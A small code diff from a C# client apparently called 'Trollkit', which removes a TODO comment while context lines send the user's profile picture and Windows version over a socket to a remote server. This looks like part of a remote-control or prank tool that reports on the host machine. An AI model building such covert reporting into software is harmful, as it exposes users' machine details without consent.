@@ -50,8 +50,6 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ProfilePicture", Value = base64ProfilePicture };
 			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
 
-			//TODO: cpu, ram??, windows version, network, peripherals
-
 			string osVersion = GetOSVersion();
 			TransferCommandObject osVersionTransferObject = new TransferCommandObject { Command = "WindowsVersion", Value = osVersion };
 			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(osVersionTransferObject));
